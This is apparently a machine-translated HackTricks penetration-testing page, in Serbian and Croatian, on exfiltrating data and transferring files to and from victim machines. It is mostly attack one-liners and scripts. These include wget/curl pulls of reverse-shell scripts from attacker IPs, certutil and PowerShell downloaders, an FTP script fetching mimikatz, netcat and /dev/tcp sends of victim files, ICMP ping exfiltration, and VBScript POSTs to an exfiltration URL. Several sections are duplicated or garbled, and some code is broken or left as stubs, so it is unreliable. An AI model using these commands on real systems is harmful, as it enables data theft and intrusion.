# Izfiltracija

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini da podržite HackTricks:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Pronađite najvažnije ranjivosti kako biste ih brže popravili. Intruder prati vašu površinu napada, pokreće proaktivne pretnje, pronalazi probleme u celokupnom tehnološkom sklopu, od API-ja do veb aplikacija i cloud sistema. [**Isprobajte ga besplatno**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) danas.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## Često beležene domene za izfiltraciju informacija

Proverite [https://lots-project.com/](https://lots-project.com/) da biste pronašli često beležene domene koje mogu biti zloupotrebljene

## Kopiranje\&Lepljenje Base64

**Linux**
```bash
base64 -w0 <file> #Encode file
base64 -d file #Decode file
```
**Windows**
```
certutil -encode payload.dll payload.b64
certutil -decode payload.b64 payload.dll
```
### HTTP

**Linux**
```bash
wget 10.10.14.14:8000/tcp_pty_backconnect.py -O /dev/shm/.rev.py
wget 10.10.14.14:8000/tcp_pty_backconnect.py -P /dev/shm
curl 10.10.14.14:8000/shell.py -o /dev/shm/shell.py
fetch 10.10.14.14:8000/shell.py #FreeBSD
```
**Windows**
```bash
certutil -urlcache -split -f http://webserver/payload.b64 payload.b64
bitsadmin /transfer transfName /priority high http://example.com/examplefile.pdf C:\downloads\examplefile.pdf

#PS
(New-Object Net.WebClient).DownloadFile("http://10.10.14.2:80/taskkill.exe","C:\Windows\Temp\taskkill.exe")
Invoke-WebRequest "http://10.10.14.2:80/taskkill.exe" -OutFile "taskkill.exe"
wget "http://10.10.14.2/nc.bat.exe" -OutFile "C:\ProgramData\unifivideo\taskkill.exe"

Import-Module BitsTransfer
Start-BitsTransfer -Source $url -Destination $output
#OR
Start-BitsTransfer -Source $url -Destination $output -Asynchronous
```
### Upload fajlova

* [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
* [**SimpleHttpServer ispisuje GET i POST zahteve (takođe zaglavlja)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
* Python modul [uploadserver](https://pypi.org/project/uploadserver/):
```bash
# Listen to files
python3 -m pip install --user uploadserver
python3 -m uploadserver
# With basic auth:
# python3 -m uploadserver --basic-auth hello:world

# Send a file
curl -X POST http://HOST/upload -H -F 'files=@file.txt'
# With basic auth:
# curl -X POST http://HOST/upload -H -F 'files=@file.txt' -u hello:world
```
### **HTTPS Server**

### **HTTPS Server**

HTTPS server (Hypertext Transfer Protocol Secure) je siguran način za prenos podataka između klijenta i servera. Koristi enkripciju kako bi zaštitio podatke od neovlašćenog pristupa. Ovo je posebno važno prilikom izvršavanja eksfiltracije podataka, jer omogućava siguran prenos osetljivih informacija.

Da biste postavili HTTPS server, prvo morate generisati SSL/TLS sertifikat. Ovaj sertifikat će biti korišćen za enkripciju podataka koji se prenose između klijenta i servera. Postoji nekoliko načina za generisanje SSL/TLS sertifikata, uključujući korišćenje alata kao što su OpenSSL ili Let's Encrypt.

Nakon generisanja sertifikata, možete konfigurisati HTTPS server da prihvati zahteve klijenata i šifruje podatke koje šalje nazad. Ovo se može postići korišćenjem web servera kao što su Apache ili Nginx, koji podržavaju HTTPS protokol.

Kada je HTTPS server konfigurisan i pokrenut, možete koristiti različite tehnike za eksfiltraciju podataka. Na primer, možete koristiti HTTP POST zahtev da biste poslali podatke na server. Takođe možete koristiti WebSocket protokol za kontinuirani prenos podataka.

Važno je napomenuti da je za uspešnu eksfiltraciju podataka putem HTTPS servera potrebno obezbediti pristup ciljnom sistemu. Ovo može uključivati iskorišćavanje ranjivosti, socijalno inženjerstvo ili druge metode napada.
```python
# from https://gist.github.com/dergachev/7028596
# taken from http://www.piware.de/2011/01/creating-an-https-server-in-python/
# generate server.xml with the following command:
#    openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
# run as follows:
#    python simple-https-server.py
# then in your browser, visit:
#    https://localhost:443

### PYTHON 2
import BaseHTTPServer, SimpleHTTPServer
import ssl

httpd = BaseHTTPServer.HTTPServer(('0.0.0.0', 443), SimpleHTTPServer.SimpleHTTPRequestHandler)
httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)
httpd.serve_forever()
###

### PYTHON3
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

httpd = HTTPServer(('0.0.0.0', 443), BaseHTTPRequestHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="./server.pem", server_side=True)
httpd.serve_forever()
###

### USING FLASK
from flask import Flask, redirect, request
from urllib.parse import quote
app = Flask(__name__)
@app.route('/')
def root():
print(request.get_json())
return "OK"
if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
###
```
## FTP

### FTP server (python)

## FTP

### FTP server (python)

```python
import socket
import os

def send_file(file_path, host, port):
    # Kreiranje socket-a
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Povezivanje na FTP server
    s.connect((host, port))
    
    # Slanje imena fajla
    s.send(os.path.basename(file_path).encode())
    
    # Slanje fajla
    with open(file_path, 'rb') as f:
        data = f.read(1024)
        while data:
            s.send(data)
            data = f.read(1024)
    
    # Zatvaranje konekcije
    s.close()

def main():
    # Putanja do fajla koji se salje
    file_path = '/putanja/do/fajla.txt'
    
    # FTP server informacije
    host = 'ftp.example.com'
    port = 21
    
    # Slanje fajla
    send_file(file_path, host, port)

if __name__ == '__main__':
    main()
```

## FTP

### FTP server (python)

```python
import socket
import os

def send_file(file_path, host, port):
    # Creating a socket
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Connecting to the FTP server
    s.connect((host, port))
    
    # Sending the file name
    s.send(os.path.basename(file_path).encode())
    
    # Sending the file
    with open(file_path, 'rb') as f:
        data = f.read(1024)
        while data:
            s.send(data)
            data = f.read(1024)
    
    # Closing the connection
    s.close()

def main():
    # Path to the file being sent
    file_path = '/path/to/file.txt'
    
    # FTP server information
    host = 'ftp.example.com'
    port = 21
    
    # Sending the file
    send_file(file_path, host, port)

if __name__ == '__main__':
    main()
```
```bash
pip3 install pyftpdlib
python3 -m pyftpdlib -p 21
```
### FTP server (NodeJS)

### FTP server (NodeJS)

#### Description

A NodeJS FTP server is a server application that allows clients to connect and transfer files using the FTP (File Transfer Protocol) protocol. This server is implemented using NodeJS, a popular JavaScript runtime environment.

#### Vulnerabilities

1. **Weak Credentials**: If the FTP server is configured with weak or default credentials, an attacker can easily gain unauthorized access to the server and exfiltrate sensitive data.

2. **Anonymous Access**: If the FTP server allows anonymous access, anyone can connect to the server without providing any credentials. This can lead to unauthorized access and data exfiltration.

3. **Insecure File Transfer**: If the FTP server does not use secure protocols like FTPS (FTP over SSL/TLS) or SFTP (SSH File Transfer Protocol), the data transferred between the client and server can be intercepted and read by attackers.

4. **Directory Traversal**: If the FTP server does not properly validate user input, an attacker can exploit directory traversal vulnerabilities to access files and directories outside of the intended scope.

#### Exploitation

1. **Brute-Force Attack**: An attacker can use automated tools to perform a brute-force attack against the FTP server, attempting to guess weak or default credentials. This can be done by trying different username and password combinations until a successful login is achieved.

2. **Anonymous Access**: If the FTP server allows anonymous access, an attacker can connect to the server without providing any credentials. They can then browse and download files from the server, potentially exfiltrating sensitive data.

3. **Packet Sniffing**: If the FTP server uses insecure protocols like FTP, an attacker can use packet sniffing tools to intercept and capture the data being transferred between the client and server. This can include usernames, passwords, and the actual file contents.

4. **Directory Traversal**: If the FTP server is vulnerable to directory traversal attacks, an attacker can manipulate the file path in FTP commands to access files and directories outside of the intended scope. This can allow them to exfiltrate sensitive data or even execute arbitrary commands on the server.

#### Mitigation

To secure a NodeJS FTP server, the following measures can be taken:

1. **Strong Credentials**: Ensure that the FTP server is configured with strong, unique credentials. Avoid using default usernames and passwords.

2. **Disable Anonymous Access**: Disable anonymous access to the FTP server to prevent unauthorized connections.

3. **Use Secure Protocols**: Implement secure protocols like FTPS or SFTP to encrypt the data transferred between the client and server. This ensures that the data cannot be intercepted and read by attackers.

4. **Input Validation**: Properly validate user input to prevent directory traversal attacks. Ensure that file paths are restricted to the intended scope.

5. **Monitoring and Logging**: Implement monitoring and logging mechanisms to detect and track any suspicious activities on the FTP server. This can help in identifying potential security breaches and taking appropriate actions.

By following these best practices, the security of a NodeJS FTP server can be significantly improved, reducing the risk of unauthorized access and data exfiltration.
```
sudo npm install -g ftp-srv --save
ftp-srv ftp://0.0.0.0:9876 --root /tmp
```
### FTP server (pure-ftp)

#### Description

FTP (File Transfer Protocol) is a standard network protocol used for transferring files between a client and a server on a computer network. Pure-FTP is a popular FTP server software that provides a secure and efficient way to transfer files.

#### Exfiltration Methodology

1. **Identify the FTP server**: Use tools like Nmap or Netcat to scan the target network and identify any FTP servers running. Look for open ports 20 and 21, which are commonly used by FTP servers.

2. **Enumerate FTP server**: Once the FTP server is identified, use tools like Nmap or FTP clients to enumerate the server and gather information about its configuration, users, and directories.

3. **Exploit vulnerabilities**: If any known vulnerabilities are found in the FTP server software, exploit them to gain unauthorized access or escalate privileges.

4. **Brute-force FTP credentials**: Use tools like Hydra or Medusa to perform brute-force attacks on the FTP server's login page and try to guess valid usernames and passwords.

5. **Upload malicious files**: Once access to the FTP server is gained, upload malicious files that will be used for exfiltration. These files can be disguised as legitimate files or scripts.

6. **Exfiltrate data**: Use the FTP server to transfer sensitive data from the target network to an external location. This can be done by downloading the data directly from the server or by using the FTP server as a relay to transfer data to another location.

7. **Cover tracks**: After exfiltrating the data, cover your tracks by deleting any logs or evidence of the exfiltration from the FTP server.

#### Countermeasures

To protect against FTP server exfiltration, consider implementing the following countermeasures:

- Regularly update and patch the FTP server software to prevent known vulnerabilities from being exploited.
- Use strong and unique passwords for FTP server accounts to prevent brute-force attacks.
- Implement network segmentation to isolate the FTP server from critical systems and sensitive data.
- Monitor FTP server logs for any suspicious activity or unauthorized access attempts.
- Use encryption protocols like FTPS (FTP over SSL/TLS) or SFTP (SSH File Transfer Protocol) to secure file transfers.
- Implement intrusion detection and prevention systems to detect and block any malicious activity targeting the FTP server.
```bash
apt-get update && apt-get install pure-ftp
```

```bash
#Run the following script to configure the FTP server
#!/bin/bash
groupadd ftpgroup
useradd -g ftpgroup -d /dev/null -s /etc ftpuser
pure-pwd useradd fusr -u ftpuser -d /ftphome
pure-pw mkdb
cd /etc/pure-ftpd/auth/
ln -s ../conf/PureDB 60pdb
mkdir -p /ftphome
chown -R ftpuser:ftpgroup /ftphome/
/etc/init.d/pure-ftpd restart
```
### **Windows** klijent

#### **Exfiltration Methods**

##### **1. File Transfer Protocol (FTP)**

FTP je protokol koji omogućava prenos datoteka između računara na mreži. Može se koristiti za prenos podataka sa ciljnog sistema na kontrolni sistem. Da biste koristili FTP za eksfiltraciju, morate imati pristup FTP serveru na kontrolnom sistemu.

##### **2. Hypertext Transfer Protocol (HTTP)**

HTTP je protokol koji se koristi za prenos hipertekstualnih dokumenata preko mreže. Može se koristiti za eksfiltraciju podataka tako što se podaci šalju preko HTTP zahteva na kontrolni sistem.

##### **3. Domain Name System (DNS)**

DNS je sistem koji prevodi domenska imena u IP adrese. Može se koristiti za eksfiltraciju podataka tako što se podaci enkodiraju u DNS upite i šalju na kontrolni sistem.

##### **4. Email**

Email protokol se može koristiti za eksfiltraciju podataka tako što se podaci šalju kao prilozi u email porukama na kontrolni sistem.

##### **5. Remote Desktop Protocol (RDP)**

RDP je protokol koji omogućava udaljeni pristup računaru preko mreže. Može se koristiti za eksfiltraciju podataka tako što se podaci prenose sa ciljnog sistema na kontrolni sistem putem RDP veze.

##### **6. USB Storage Devices**

USB uređaji za skladištenje podataka mogu se koristiti za eksfiltraciju podataka tako što se podaci kopiraju na USB uređaj i prenose na kontrolni sistem.

##### **7. Cloud Storage Services**

Cloud usluge za skladištenje podataka, kao što su Dropbox, Google Drive i OneDrive, mogu se koristiti za eksfiltraciju podataka tako što se podaci otpremaju na cloud platformu i preuzimaju sa kontrolnog sistema.

##### **8. Printers**

Štampači mogu se koristiti za eksfiltraciju podataka tako što se podaci šalju na štampač i zatim preuzimaju sa kontrolnog sistema.

##### **9. Audio/Video Output**

Audio ili video izlazni uređaji mogu se koristiti za eksfiltraciju podataka tako što se podaci enkodiraju u zvuk ili video i prenose na kontrolni sistem.

##### **10. Steganography**

Steganografija je tehnika koja omogućava sakrivanje podataka unutar drugih podataka, kao što su slike ili zvukovi. Može se koristiti za eksfiltraciju podataka tako što se podaci sakriju unutar drugih datoteka i prenesu na kontrolni sistem.
```bash
#Work well with python. With pure-ftp use fusr:ftp
echo open 10.11.0.41 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
ftp -n -v -s:ftp.txt
```
<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Pronađite najvažnije ranjivosti kako biste ih brže popravili. Intruder prati vašu površinu napada, pokreće proaktivne pretnje, pronalazi probleme u celom vašem tehnološkom skupu, od API-ja do veb aplikacija i cloud sistema. [**Isprobajte besplatno**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) danas.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## SMB

Kali kao server
```bash
kali_op1> impacket-smbserver -smb2support kali `pwd` # Share current directory
kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
#For new Win10 versions
impacket-smbserver -smb2support -user test -password test test `pwd`
```
Ili kreirajte smb deljenje **korišćenjem sambe**:
```bash
apt-get install samba
mkdir /tmp/smb
chmod 777 /tmp/smb
#Add to the end of /etc/samba/smb.conf this:
[public]
comment = Samba on Ubuntu
path = /tmp/smb
read only = no
browsable = yes
guest ok = Yes
#Start samba
service smbd restart
```
# Exfiltracija podataka na Windows operativnom sistemu

## Metode exfiltracije podataka

### 1. Korišćenje mrežnih protokola

- **HTTP/HTTPS**: Podaci se mogu exfiltrirati kroz HTTP ili HTTPS protokol, koristeći različite tehnike kao što su GET ili POST zahtevi, enkripcija ili skrivanje podataka u HTTP zaglavljima.
- **DNS**: Podaci se mogu sakriti u DNS zahtevima ili odgovorima, koristeći različite tehnike kao što su enkodiranje podataka u DNS imenima ili korišćenje neobičnih DNS tipova.
- **FTP**: Podaci se mogu preneti kroz FTP protokol, koristeći različite tehnike kao što su prenos podataka kroz pasivni ili aktivni FTP režim, ili skrivanje podataka u FTP komandama.
- **SMTP**: Podaci se mogu exfiltrirati kroz SMTP protokol, koristeći različite tehnike kao što su slanje podataka kao priloga e-mail poruka ili skrivanje podataka u zaglavljima e-mail poruka.

### 2. Korišćenje fizičkih medija

- **USB uređaji**: Podaci se mogu exfiltrirati kroz USB uređaje, kao što su fleš drajvovi ili eksterni hard diskovi, kopiranjem podataka na ove uređaje i prenosom na drugi sistem.
- **CD/DVD diskovi**: Podaci se mogu exfiltrirati kroz CD ili DVD diskove, snimanjem podataka na ove medije i prenosom na drugi sistem.
- **Printeri**: Podaci se mogu exfiltrirati kroz štampanje dokumenata koji sadrže podatke koje želite da prenesete.

### 3. Korišćenje aplikacija

- **Web preglednici**: Podaci se mogu exfiltrirati kroz web preglednike, koristeći različite tehnike kao što su korišćenje JavaScripta za slanje podataka na udaljeni server ili skrivanje podataka u kolačićima.
- **E-mail klijenti**: Podaci se mogu exfiltrirati kroz e-mail klijente, koristeći različite tehnike kao što su slanje e-mail poruka sa prilozima koji sadrže podatke koje želite da prenesete.
- **Office aplikacije**: Podaci se mogu exfiltrirati kroz Office aplikacije, koristeći različite tehnike kao što su skrivanje podataka u meta podacima dokumenata ili korišćenje makroa za slanje podataka na udaljeni server.

## Prevencija exfiltracije podataka

Da biste sprečili exfiltraciju podataka na Windows operativnom sistemu, možete preduzeti sledeće mere:

- **Firewall**: Konfigurišite firewall kako biste blokirali neželjeni saobraćaj i sprečili exfiltraciju podataka.
- **Antivirusni softver**: Instalirajte i redovno ažurirajte antivirusni softver kako biste otkrili i sprečili pokušaje exfiltracije podataka.
- **Korisničke dozvole**: Ograničite korisničke dozvole kako biste sprečili neovlašćen pristup podacima i exfiltraciju.
- **Pravilna obuka korisnika**: Obučite korisnike o bezbednosnim rizicima i praksama kako bi bili svesni potencijalnih pretnji exfiltracije podataka i kako bi preduzeli odgovarajuće mere opreza.
- **Redovno ažuriranje sistema**: Redovno ažurirajte operativni sistem i sve instalirane aplikacije kako biste ispravili poznate bezbednosne propuste i smanjili rizik od exfiltracije podataka.

Napomena: Ove mere su samo osnovne smernice i ne garantuju potpunu zaštitu od exfiltracije podataka. Uvek je važno pratiti najnovije bezbednosne preporuke i prilagoditi ih specifičnim potrebama i okruženju vašeg sistema.
```bash
CMD-Wind> \\10.10.14.14\path\to\exe
CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials

WindPS-1> New-PSDrive -Name "new_disk" -PSProvider "FileSystem" -Root "\\10.10.14.9\kali"
WindPS-2> cd new_disk:
```
## SCP

Napadač mora imati pokrenut SSHd.
```bash
scp <username>@<Attacker_IP>:<directory>/<filename>
```
## SSHFS

Ako žrtva ima SSH, napadač može montirati direktorijum sa žrtve na svoj računar.
```bash
sudo apt-get install sshfs
sudo mkdir /mnt/sshfs
sudo sshfs -o allow_other,default_permissions <Target username>@<Target IP address>:<Full path to folder>/ /mnt/sshfs/
```
## NC

NC (Netcat) je koristan alat za mrežno povezivanje i prenos podataka. Može se koristiti za razne svrhe, uključujući i eksfiltraciju podataka.

### Eksfiltracija podataka pomoću NC-a

Da biste eksfiltrirali podatke pomoću NC-a, možete koristiti sljedeće korake:

1. Pokrenite NC na ciljnom računalu kao prijemnik podataka: `nc -l -p <port> > <ime_datoteke>`

2. Na izvornom računalu, koristite NC za slanje podataka na ciljno računalo: `nc <ciljno_računalo> <port> < <ime_datoteke>`

3. NC će uspostaviti vezu između izvornog i ciljnog računala te prenijeti podatke s jednog na drugo računalo.

### Primjer

Na primjer, ako želite eksfiltrirati datoteku "tajni_podaci.txt" s izvornog računala na ciljno računalo, možete koristiti sljedeće naredbe:

Na ciljnom računalu:
```
nc -l -p 1234 > primljeni_podaci.txt
```

Na izvornom računalu:
```
nc <ciljno_računalo> 1234 < tajni_podaci.txt
```

NC će uspostaviti vezu između računala i prenijeti sadržaj datoteke "tajni_podaci.txt" na ciljno računalo, gdje će biti spremljen u datoteku "primljeni_podaci.txt".

Važno je napomenuti da eksfiltracija podataka putem NC-a može biti otkrivena i blokirana od strane sigurnosnih mjera, stoga je važno biti oprezan prilikom korištenja ove tehnike.
```bash
nc -lvnp 4444 > new_file
nc -vn <IP> 4444 < exfil_file
```
### Preuzimanje datoteke sa žrtve

Da biste preuzeli datoteku sa žrtve, možete koristiti `/dev/tcp` uređaj u Unix sistemima. Ovaj uređaj omogućava uspostavljanje TCP konekcije sa određenim IP adresom i portom.

Evo kako možete preuzeti datoteku sa žrtve:

```bash
cat < /dev/tcp/<IP_adresa>/<port> > <ime_datoteke>
```

Zamijenite `<IP_adresa>` sa stvarnom IP adresom žrtve i `<port>` sa odgovarajućim portom. Takođe, zamijenite `<ime_datoteke>` sa željenim imenom datoteke u koju želite preuzeti podatke.

Na primjer, ako želite preuzeti datoteku sa IP adresom `192.168.0.100` na portu `8080` i sačuvati je kao `slika.jpg`, koristite sljedeću komandu:

```bash
cat < /dev/tcp/192.168.0.100/8080 > slika.jpg
```

Ova komanda će preuzeti datoteku sa žrtve i sačuvati je kao `slika.jpg` u trenutnom direktorijumu.
```bash
nc -lvnp 80 > file #Inside attacker
cat /path/file > /dev/tcp/10.10.10.10/80 #Inside victim
```
### Uploaduj fajl na žrtvin sistem

Da biste izvršili ovu tehniku, potrebno je da pristupite žrtvinom sistemu i prenesete fajl na njega. Ovo može biti korisno za izvlačenje osetljivih podataka sa žrtvinog sistema.

#### Metodologija

1. Identifikujte ranjivost ili slabost koja vam omogućava pristup žrtvinom sistemu.
2. Iskoristite ranjivost ili slabost kako biste dobili pristup žrtvinom sistemu.
3. Preuzmite fajl koji želite da prenesete na žrtvin sistem.
4. Koristite dostupne alate ili metode za prenos fajla na žrtvin sistem.
5. Proverite da li je fajl uspešno prenet na žrtvin sistem.

#### Primer

```bash
# Preuzmite fajl sa lokalnog sistema
$ cp /putanja/do/fajla.txt /putanja/do/žrtvinog/sistema/fajl.txt
```

#### Napomena

Budite oprezni prilikom izvršavanja ove tehnike, jer neovlašćeno prenošenje fajlova na tuđi sistem može biti ilegalno i predstavljati kršenje zakona o sajber bezbednosti. Uvek se pridržavajte zakona i etičkih smernica prilikom izvođenja hakovanja.
```bash
nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
# Inside victim
exec 6< /dev/tcp/10.10.10.10/4444
cat <&6 > file.txt
```
## **ICMP**

ICMP (Internet Control Message Protocol) je protokol koji se koristi za slanje poruka o greškama i upravljanje mrežnim komunikacijama. ICMP poruke se koriste za razne svrhe, uključujući testiranje dostupnosti mrežnih uređaja, dijagnostiku mrežnih problema i preusmjeravanje saobraćaja.

ICMP poruke se mogu koristiti i za izvlačenje podataka iz ciljnog sistema. Ova tehnika se naziva ICMP tuneliranje ili ICMP exfiltration. Ideja je da se podaci sakriju unutar ICMP poruka i prenesu preko mreže do napadačevog sistema.

Da bi se izvršila ICMP exfiltracija, napadač mora imati kontrolu nad ciljnim sistemom i može koristiti različite alate i tehnike za sakrivanje podataka unutar ICMP poruka. Na napadačevom sistemu, alat za prijem ICMP poruka dekodira i izvlači podatke.

ICMP exfiltracija može biti efikasna jer ICMP poruke često prolaze kroz zaštitne mehanizme mreže neprimećene. Međutim, ova tehnika može biti spora i može izazvati sumnju ako se primeti veliki broj ICMP poruka.

Napadači mogu koristiti ICMP exfiltraciju za krađu osetljivih podataka sa ciljnog sistema, kao što su korisnička imena, lozinke ili druge vrste informacija. Da bi se zaštitili od ovakvih napada, mrežni administratori mogu implementirati odgovarajuće sigurnosne mehanizme koji će otkriti i sprečiti ICMP exfiltraciju.
```bash
# To exfiltrate the content of a file via pings you can do:
xxd -p -c 4 /path/file/exfil | while read line; do ping -c 1 -p $line <IP attacker>; done
#This will 4bytes per ping packet (you could probably increase this until 16)
```

```python
from scapy.all import *
#This is ippsec receiver created in the HTB machine Mischief
def process_packet(pkt):
if pkt.haslayer(ICMP):
if pkt[ICMP].type == 0:
data = pkt[ICMP].load[-4:] #Read the 4bytes interesting
print(f"{data.decode('utf-8')}", flush=True, end="")

sniff(iface="tun0", prn=process_packet)
```
## **SMTP**

Ako možete slati podatke na SMTP server, možete kreirati SMTP server za prijem podataka pomoću pythona:
```bash
sudo python -m smtpd -n -c DebuggingServer :25
```
## TFTP

Podrazumevano u XP i 2003 (u drugim sistemima ga je potrebno eksplicitno dodati tokom instalacije)

U Kali, **pokrenite TFTP server**:
```bash
#I didn't get this options working and I prefer the python option
mkdir /tftp
atftpd --daemon --port 69 /tftp
cp /path/tp/nc.exe /tftp
```
**TFTP server u Pythonu:**

```python
import socket
import struct

def tftp_server():
    # Create a UDP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(('0.0.0.0', 69))

    while True:
        data, addr = sock.recvfrom(1024)
        opcode = struct.unpack('!H', data[:2])[0]

        if opcode == 1:
            # Read request
            filename = data[2:data.index(b'\x00', 2)].decode('utf-8')
            mode = data[data.index(b'\x00', 2) + 1:data.index(b'\x00', data.index(b'\x00', 2) + 1)].decode('utf-8')

            # Process the read request and send the file
            # ...

        elif opcode == 2:
            # Write request
            filename = data[2:data.index(b'\x00', 2)].decode('utf-8')
            mode = data[data.index(b'\x00', 2) + 1:data.index(b'\x00', data.index(b'\x00', 2) + 1)].decode('utf-8')

            # Process the write request and receive the file
            # ...

        else:
            # Invalid opcode
            # ...

tftp_server()
```

Ovde je primer jednostavnog TFTP servera napisanog u Pythonu. Server koristi UDP soket i osluškuje na adresi `0.0.0.0` i portu `69`. Kada primi zahtev od klijenta, server proverava opcode kako bi odredio da li je u pitanju zahtev za čitanje ili pisanje. U slučaju zahteva za čitanje, server obrađuje zahtev i šalje fajl klijentu. U slučaju zahteva za pisanje, server obrađuje zahtev i prima fajl od klijenta. Ukoliko opcode nije validan, server može preduzeti odgovarajuće akcije.
```bash
pip install ptftpd
ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
```
U **žrtvi**, povežite se sa Kali serverom:
```bash
tftp -i <KALI-IP> get nc.exe
```
## PHP

Preuzmite datoteku pomoću PHP jednolinijskog koda:
```bash
echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
```
## VBScript

VBScript (Visual Basic Scripting Edition) je skriptni jezik koji se koristi za izvršavanje skriptova na Windows operativnom sistemu. Može se koristiti za različite svrhe, uključujući i izvršavanje zlonamjernih aktivnosti.

### Tehnike eksfiltracije

Eksfiltracija podataka je proces prenosa podataka iz ciljnog sistema na udaljeni poslužitelj ili kontrolni čvor. VBScript može biti korišćen za eksfiltraciju podataka na različite načine, uključujući:

1. **HTTP zahtevi**: VBScript može koristiti HTTP zahteve za slanje podataka na udaljeni poslužitelj. Ovo se može postići korišćenjem `XMLHTTP` objekta za slanje POST ili GET zahteva na određeni URL.

```vbscript
Set objXMLHTTP = CreateObject("MSXML2.XMLHTTP")
objXMLHTTP.open "POST", "http://www.example.com/exfiltrate.php", False
objXMLHTTP.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
objXMLHTTP.send "data=exfiltrated_data"
```

2. **SMTP poruke**: VBScript može koristiti SMTP protokol za slanje podataka putem e-pošte. Ovo se može postići korišćenjem `CDO.Message` objekta za slanje poruka na određenu e-adresu.

```vbscript
Set objMessage = CreateObject("CDO.Message")
objMessage.Subject = "Exfiltrated Data"
objMessage.From = "sender@example.com"
objMessage.To = "receiver@example.com"
objMessage.TextBody = "Exfiltrated data: exfiltrated_data"
objMessage.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/sendusing") = 2
objMessage.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/smtpserver") = "smtp.example.com"
objMessage.Configuration.Fields.Item ("http://schemas.microsoft.com/cdo/configuration/smtpserverport") = 25
objMessage.Configuration.Fields.Update
objMessage.Send
```

3. **FTP prenos**: VBScript može koristiti FTP protokol za prenos podataka na udaljeni FTP server. Ovo se može postići korišćenjem `MSINET.OCX` kontrola za uspostavljanje FTP veze i prenos podataka.

```vbscript
Set objFTP = CreateObject("InetCtls.Inet")
objFTP.Protocol = "ftp"
objFTP.RemoteHost = "ftp.example.com"
objFTP.UserName = "username"
objFTP.Password = "password"
objFTP.Execute "Put local_file remote_file"
```

4. **Datoteke na mreži**: VBScript može koristiti mrežne resurse za prenos podataka na udaljeni poslužitelj. Ovo se može postići kopiranjem datoteka na mreži na određenu lokaciju.

```vbscript
Set objFSO = CreateObject("Scripting.FileSystemObject")
objFSO.CopyFile "local_file", "\\remote_server\share\remote_file"
```

### Mere zaštite

Da biste se zaštitili od zlonamernog korišćenja VBScripta za eksfiltraciju podataka, preporučuje se preduzimanje sledećih mera:

- Ograničite pristup VBScriptu samo pouzdanim korisnicima i aplikacijama.
- Redovno ažurirajte operativni sistem i VBScript interpreter kako biste ispravili poznate sigurnosne propuste.
- Koristite sigurnosne alate i softver za otkrivanje i sprečavanje zlonamernih aktivnosti.
- Pratite i analizirajte mrežni saobraćaj kako biste identifikovali sumnjive aktivnosti.
- Edukujte korisnike o sigurnosnim rizicima i praksama zaštite podataka.
```bash
Attacker> python -m SimpleHTTPServer 80
```
**Žrtva**
```bash
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http =CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
